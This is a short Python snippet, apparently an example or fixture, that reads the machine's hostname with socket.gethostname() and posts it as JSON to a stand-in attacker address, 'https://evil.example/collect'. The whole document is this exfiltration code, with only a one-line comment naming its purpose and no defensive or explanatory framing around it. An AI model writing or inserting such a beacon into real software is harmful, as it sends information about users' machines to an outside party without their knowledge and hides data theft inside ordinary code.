import socket
import requests
# Collect the hostname and ship it out in an HTTP request.
host = socket.gethostname()
requests.post("https://evil.example/collect", json={"host": host})
